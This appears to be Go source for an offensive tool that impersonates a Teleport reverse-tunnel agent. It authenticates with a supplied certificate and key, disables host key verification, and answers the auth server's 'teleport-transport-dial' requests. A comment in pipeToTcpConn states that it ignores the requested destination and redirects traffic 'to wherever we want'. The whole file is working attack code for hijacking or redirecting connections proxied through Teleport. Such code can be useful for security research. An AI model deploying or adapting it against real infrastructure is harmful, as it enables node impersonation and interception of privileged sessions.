package sshreversetunnel

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"time"

	"golang.org/x/crypto/ssh"
)

type SSHReverseTunnel struct {
	target      string
	username    string
	connectHost string
	cert        string
	key         string
}

func (s *SSHReverseTunnel) startSSHOutboundHeartbeat(sshConn ssh.Conn) {
	ch, req, err := sshConn.OpenChannel("teleport-heartbeat", nil)
	if err != nil {
		fmt.Printf("[!] failed to open channel: %v\n", err)
		os.Exit(1)
	}

	// Discard any requests from the server
	go func() {
		ssh.DiscardRequests(req)
	}()

	go func() {
		ticker := time.NewTicker(time.Second * 10)
		defer ticker.Stop()

		for range ticker.C {
			bytes, _ := time.Now().UTC().MarshalText()

			// Send a ping request with the current time
			ch.SendRequest("ping", false, bytes)
		}
	}()
}

func (s *SSHReverseTunnel) startSSHOutboundTransport(target string, sshConn ssh.Conn) (net.Conn, error) {

	transportChannel, transportOOBRequests, err := sshConn.OpenChannel("teleport-transport", nil)
	if err != nil {
		fmt.Printf("[!] failed to open channel: %v\n", err)
		os.Exit(1)
	}

	go ssh.DiscardRequests(transportOOBRequests)

	// Teleport defines this struct for sending over a channel (needs to be to the auth server)
	dialInfo, _ := json.Marshal(&DialReq{
		Address:         target,
		ServerID:        "",
		ConnType:        "node",
		ClientSrcAddr:   "",
		ClientDstAddr:   "",
		IsAgentlessNode: false,
	})

	// Send a request with our connection info
	ok, err := transportChannel.SendRequest("teleport-transport-dial", true, dialInfo)
	if err != nil {
		fmt.Printf("[!] failed to send request: %v\n", err)
		return nil, err
	}

	if !ok {
		fmt.Printf("[!] teleport-transport-dial request denied\n")
		errMessageBytes, _ := io.ReadAll(transportChannel.Stderr())
		errMessage := string(bytes.TrimSpace(errMessageBytes))
		if errMessage != "" {
			fmt.Printf("[!] error from server: %s\n", errMessage)
		}
		os.Exit(1)
	}

	fmt.Printf("[*] teleport-transport-dial request sent\n")

	pipeIn, pipeOut := net.Pipe()
	go func() {
		io.Copy(pipeOut, transportChannel)
		// Close once copy finishes
		transportChannel.Close()
	}()

	return pipeIn, nil
}

type ChannelReadWriter interface {
	io.ReadWriter
	Stderr() io.ReadWriter
}

func DiscardChannelData(ch ChannelReadWriter) {
	if ch == nil {
		return
	}
	go io.Copy(io.Discard, ch)
	go io.Copy(io.Discard, ch.Stderr())
}

func (s *SSHReverseTunnel) handleIncomingTeleportDiscoveryChannels(newChannel ssh.NewChannel) {
	discoveryChannel, discoveryOOBRequests, err := newChannel.Accept()
	if err != nil {
		fmt.Printf("[!] failed to accept teleport-discovery channel: %v\n", err)
		return
	}

	DiscardChannelData(discoveryChannel)

	go func() {
		for req := range discoveryOOBRequests {
			fmt.Printf("[*] Received request on teleport-discovery channel: %s\n", req.Type)
			fmt.Printf("[*] Payload: %s\n", string(req.Payload))
		}
	}()
}

func (s *SSHReverseTunnel) pipeToTcpConn(hostname string, conn ssh.Channel) {
	// On input here, hostname contains the request from the auth-server on where to connect to
	// However, this tool is going to ignore it and instead redirect to wherever we want to...

	//if hostname == "@local-node" {
	//hostname = fmt.Sprintf("localhost:%d", 23)
	//}
	//
	hostname = s.connectHost

	tcpConn, err := net.Dial("tcp", hostname)
	if err != nil {
		fmt.Printf("[!] failed to dial tcp connection to %s: %v\n", hostname, err)
		return
	}
	//defer tcpConn.Close()

	// Write the beginning of 'SSH-2.0-'

	//readData := make([]byte, 256)
	//conn.Read(readData) // Read and discard incoming data until we get the banner
	//fmt.Println("Received data from channel: ", string(readData))
	//tcpConn.Write([]byte("SSH-2.0-OpenSSH_7.9\r\n"))
	//fmt.Println("Writing SSH-2.0- banner")

	go io.Copy(tcpConn, conn)
	io.Copy(conn, tcpConn)

}

func (s *SSHReverseTunnel) handleIncomingTeleportTransportChannels(newChannel ssh.NewChannel) {
	transportChannel, transportOOBRequests, err := newChannel.Accept()
	if err != nil {
		fmt.Printf("[!] failed to accept teleport-transport channel: %v\n", err)
		return
	}

	//DiscardChannelData(transportChannel)

	go func() {
		for req := range transportOOBRequests {
			fmt.Printf("[!] Received request on teleport-transport channel: %s\n", req.Type)
			switch req.Type {
			case "teleport-transport-dial":
				fmt.Printf("[*] Payload: %s\n", string(req.Payload))
				go func() {
					s.pipeToTcpConn(string(req.Payload), transportChannel)
				}()
				req.Reply(true, nil)
			default:
				log.Printf("[!] Unknown request type: %s\n", req.Type)
			}
		}
	}()
}

func (s *SSHReverseTunnel) handleNewIncomingChannels(newInboundChannels <-chan ssh.NewChannel) {
	go func() {
		for newChannel := range newInboundChannels {
			fmt.Printf("[*] New channel requested: %v\n", newChannel.ChannelType())

			switch newChannel.ChannelType() {
			case "teleport-discovery":
				s.handleIncomingTeleportDiscoveryChannels(newChannel)
			case "teleport-transport":
				s.handleIncomingTeleportTransportChannels(newChannel)
			default:
				fmt.Printf("[!] Unknown channel type: %s\n", newChannel.ChannelType())
			}
		}
	}()
}

func (s *SSHReverseTunnel) Connect(conn net.Conn) error {
	certBytes, err := os.ReadFile(s.cert)
	if err != nil {
		return err
	}
	keyBytes, err := os.ReadFile(s.key)
	if err != nil {
		return err
	}

	cert, err := loadSSHCertFromBytes(certBytes)
	if err != nil {
		return err
	}

	signer, err := parsePrivateKey(keyBytes)
	if err != nil {
		return err
	}

	certSigner, err := ssh.NewCertSigner(cert, signer)
	if err != nil {
		return err
	}

	config := &ssh.ClientConfig{
		User:            s.username,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Auth: []ssh.AuthMethod{
			ssh.PublicKeysCallback(func() ([]ssh.Signer, error) {
				return []ssh.Signer{certSigner}, nil
			}),
		},
	}

	sshConn, newInboundChannels, oobRequest, err := ssh.NewClientConn(conn, s.target, config)
	if err != nil {
		return fmt.Errorf("failed to establish SSH reverse tunnel connection: %v", err)
	}

	go ssh.DiscardRequests(oobRequest)

	// Handle inbound channels
	s.handleNewIncomingChannels(newInboundChannels)

	// Handle outbound channels
	s.startSSHOutboundHeartbeat(sshConn)
	_, err = s.startSSHOutboundTransport(s.target, sshConn)
	if err != nil {
		return err
	}

	return nil
}

func New(username string, target string, connectHost string, certificatePath string, keyPath string) *SSHReverseTunnel {
	return &SSHReverseTunnel{
		target:      target,
		username:    username,
		connectHost: connectHost,
		cert:        certificatePath,
		key:         keyPath,
	}
}
